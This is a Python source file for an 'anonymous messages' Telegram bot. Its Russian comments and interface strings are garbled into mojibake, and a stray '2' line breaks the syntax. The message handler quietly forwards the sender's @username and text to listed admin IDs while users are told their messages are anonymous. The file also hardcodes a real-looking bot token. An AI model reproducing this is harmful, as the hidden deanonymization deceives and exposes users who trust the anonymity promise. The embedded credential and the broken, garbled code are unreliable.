import telebot
from telebot import types
from datetime import datetime, timedelta

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞ (–≤—Å—Ç–∞–≤—å —Å–≤–æ–π —Ç–æ–∫–µ–Ω –≤–º–µ—Å—Ç–æ 'YOUR_BOT_TOKEN')
API_TOKEN = '7879954274:AAE7yR9UGAYUDX1sgSBWpdjbpGgOsoDgNeY'
bot = telebot.TeleBot(API_TOKEN)

# –°–ø–∏—Å–æ–∫ ID –∞–¥–º–∏–Ω–æ–≤ (–º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ)
ADMIN_IDS = [1418076557, 838467332]  # –ü—Ä–∏–º–µ—Ä ID

# –£–ª—É—á—à–µ–Ω–Ω–æ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
active_conversations = {}  # {user_id: {"partner_id": int, "expires": datetime}}
message_pairs = {}  # {user_msg_id: {"original_sender": int, "original_receiver": int}}

# –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
def log(action, details):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {action}: {details}")

def create_reply_keyboard(conversation_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("‚úâÔ∏è –û—Ç–≤–µ—Ç–∏—Ç—å", callback_data=f"reply_{conversation_id}"))
    return markup

@bot.message_handler(commands=['start'])
def start(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    log("START", f"User {user_id} (@{message.from_user.username})")

    if len(args) > 1 and args[1].isdigit():
        partner_id = int(args[1])
        # –°–æ–∑–¥–∞–µ–º –¥–≤—É—Ö—Å—Ç–æ—Ä–æ–Ω–Ω—é—é –±–µ—Å–µ–¥—É
        active_conversations[user_id] = {
            "partner_id": partner_id,
            "expires": datetime.now() + timedelta(hours=24)
        }
        active_conversations[partner_id] = {
            "partner_id": user_id,
            "expires": datetime.now() + timedelta(hours=24)
        }
        
        log("CONVERSATION_STARTED", f"Between {user_id} and {partner_id}")
        bot.send_message(user_id, "‚úçÔ∏è –ù–∞–ø–∏—à–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:", parse_mode="Markdown")
    else:
        link = f"https://t.me/{bot.get_me().username}?start={user_id}"
        log("LINK_GENERATED", f"For {user_id}: {link}")
        bot.send_message(
            user_id,
            f"üîó –í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è –∞–Ω–æ–Ω–∏–º–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π:\n\n"
            f"[–ù–∞–∂–º–∏—Ç–µ –∑–¥–µ—Å—å]({link}) –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –¥—Ä—É–∑—å—è–º:\n"
            f"`{link}`",
            parse_mode="Markdown"
        )

@bot.message_handler(func=lambda message: True)
def handle_message(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in active_conversations:
        partner_id = active_conversations[user_id]["partner_id"]
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        sent_msg = bot.send_message(
            partner_id,
            f"üì® –ê–Ω–æ–Ω–∏–º–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:\n\n{message.text}",
            parse_mode="Markdown",
            reply_markup=create_reply_keyboard(user_id)
        )
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–≤—è–∑—å —Å–æ–æ–±—â–µ–Ω–∏–π
        message_pairs[sent_msg.message_id] = {
            "original_sender": user_id,
            "original_receiver": partner_id
        }
        
        log("MESSAGE_SENT", 
            f"From {user_id} to {partner_id} | "
            f"MsgID: {sent_msg.message_id}")
        
        # –î–ª—è –∞–¥–º–∏–Ω–æ–≤
        if partner_id in ADMIN_IDS:
            bot.send_message(
                partner_id,
                f"üëÅÔ∏è –ê–¥–º–∏–Ω: —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç @{message.from_user.username}:\n{message.text}",
                parse_mode="Markdown"
            )
        
        bot.send_message(user_id, "‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
def handle_reply(call: types.CallbackQuery):
    try:
        original_sender_id = int(call.data.split('_')[1])
        current_user_id = call.from_user.id
        
        if original_sender_id in active_conversations:
            # –û–±–Ω–æ–≤–ª—è–µ–º –±–µ—Å–µ–¥—É
            active_conversations[current_user_id] = {
                "partner_id": original_sender_id,
                "expires": datetime.now() + timedelta(hours=24)
            }
            
            log("REPLY_INITIATED", 
                f"User {current_user_id} replying to {original_sender_id}")
            
            bot.send_message(
                current_user_id,
                "‚úçÔ∏è –ù–∞–ø–∏—à–∏—Ç–µ –æ—Ç–≤–µ—Ç:",
                parse_mode="Markdown"
            )
            bot.answer_callback_query(call.id, "–ì–æ—Ç–æ–≤–æ –∫ –æ—Ç–≤–µ—Ç—É")
        else:
            log("REPLY_FAILED", "Conversation expired")
            bot.answer_callback_query(call.id, "‚ùå –î–∏–∞–ª–æ–≥ –∑–∞–≤–µ—Ä—à–µ–Ω")
    except Exception as e:
        log("CALLBACK_ERROR", f"Error: {str(e)}")
        bot.answer_callback_query(call.id, "‚ùå –û—à–∏–±–∫–∞")
2
def cleanup_expired():
    now = datetime.now()
    expired = [uid for uid, conv in active_conversations.items() if conv["expires"] < now]
    for uid in expired:
        del active_conversations[uid]
    if expired:
        log("CLEANUP", f"Removed {len(expired)} expired conversations")

if __name__ == "__main__":
    print("=== –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω ===")
    print(f"–ê–¥–º–∏–Ω—ã: {ADMIN_IDS}")
    print("=== –õ–æ–≥–∏ ===")
    
    # –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –æ—á–∏—Å—Ç–∫–∞
    import threading
    def schedule_cleanup():
        while True:
            cleanup_expired()
            threading.Event().wait(3600)  # –ö–∞–∂–¥—ã–π —á–∞—Å
    
    cleanup_thread = threading.Thread(target=schedule_cleanup)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    bot.polling()